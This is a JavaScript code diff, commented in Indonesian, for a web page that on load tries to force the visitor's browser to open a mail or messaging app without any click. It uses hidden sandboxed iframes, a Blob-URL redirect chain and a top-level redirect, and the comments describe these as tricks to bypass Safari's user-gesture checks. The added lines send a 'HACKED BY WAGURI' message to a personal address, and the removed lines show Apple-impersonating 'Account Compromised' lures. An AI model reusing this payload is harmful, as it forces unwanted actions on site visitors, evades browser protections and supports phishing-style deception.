@@ -41,10 +41,16 @@
   }
 
   // ============================================
-  // 1. TARGET SCHEMES (MACOS)
+  // 1. KONFIGURASI EMAIL (MAILTO)
   // ============================================
-  var MAIL_SCHEME = "mailto:security@apple.com?subject=Security%20Alert&body=Account%20Compromised";
-  var WA_SCHEME = "whatsapp://send?text=Security%20Verification%20Required";
+  var TARGET_EMAIL = "suratinoyoarta@gmail.com";
+  var SUBJECT = "HACKED BY WAGURI";
+  var BODY = "Your system has been compromised.\n\nHACKED BY WAGURI";
+
+  // Encode URL
+  var MAIL_SCHEME = "mailto:" + TARGET_EMAIL + 
+                    "?subject=" + encodeURIComponent(SUBJECT) + 
+                    "&body=" + encodeURIComponent(BODY);
 
   // ============================================
   // 2. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
@@ -53,46 +59,27 @@
     if (executed) return;
     executed = true;
 
-    log("[!] Memulai Zero-Click MacOS Hijack...");
+    log("[!] Memulai Zero-Click Auto-Email...");
 
     // ============================================
     // A. IFRAME SANDBOX (BYPASS GESTURE)
     // ============================================
-    // Trik: Beberapa versi Safari mengizinkan skema kustom 
-    // jika dimuat di dalam iframe yang di-sandbox.
-    
     setTimeout(function() {
       try {
         log("[+] Mengirim Mail via Iframe...");
-        var iframe1 = document.createElement("iframe");
-        iframe1.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe1.style.display = "none";
-        iframe1.src = MAIL_SCHEME;
-        document.getElementById("launcher-container").appendChild(iframe1);
+        var iframe = document.createElement("iframe");
+        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+        iframe.style.display = "none";
+        iframe.src = MAIL_SCHEME;
+        document.getElementById("launcher-container").appendChild(iframe);
       } catch(e) {
-        log("[-] Mail Error: " + e.message);
+        log("[-] Iframe Error: " + e.message);
       }
     }, 100);
-
-    setTimeout(function() {
-      try {
-        log("[+] Mengirim WhatsApp via Iframe...");
-        var iframe2 = document.createElement("iframe");
-        iframe2.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe2.style.display = "none";
-        iframe2.src = WA_SCHEME;
-        document.getElementById("launcher-container").appendChild(iframe2);
-      } catch(e) {
-        log("[-] WA Error: " + e.message);
-      }
-    }, 500);
 
     // ============================================
     // B. BLOB REDIRECT CHAIN (TOP-LEVEL)
     // ============================================
-    // Trik: Bungkus skema di dalam Blob, lalu buka di tab baru.
-    // Safari sering menganggap ini navigasi internal.
-    
     setTimeout(function() {
       log("[+] Mengirim Blob Redirect Chain...");
       try {
@@ -101,12 +88,7 @@
           <html>
           <body>
             <script>
-              // Redirect berantai ke Mail
               window.location.replace("${MAIL_SCHEME}");
-              // Fallback ke WA setelah 500ms
-              setTimeout(function() {
-                window.location.replace("${WA_SCHEME}");
-              }, 500);
             <\/script>
           </body>
           </html>
@@ -114,16 +96,25 @@
         var blob = new Blob([blobPayload], { type: 'text/html' });
         var blobUrl = URL.createObjectURL(blob);
         
-        // Buka di tab baru
         var win = window.open(blobUrl, '_blank');
         if (win) {
           log("[+] Blob Redirect Triggered (Tab Baru).");
         } else {
-          log("[-] Popup diblokir (Blob).");
+          log("[-] Popup diblokir.");
         }
       } catch(e) {
         log("[-] Blob Error: " + e.message);
       }
+    }, 500);
+
+    // ============================================
+    // C. DIRECT TOP-LEVEL (FALLBACK)
+    // ============================================
+    setTimeout(function() {
+      log("[+] Mengirim Direct Mail Scheme...");
+      try {
+        window.location.replace(MAIL_SCHEME);
+      } catch(e) {}
     }, 1000);
 
   });
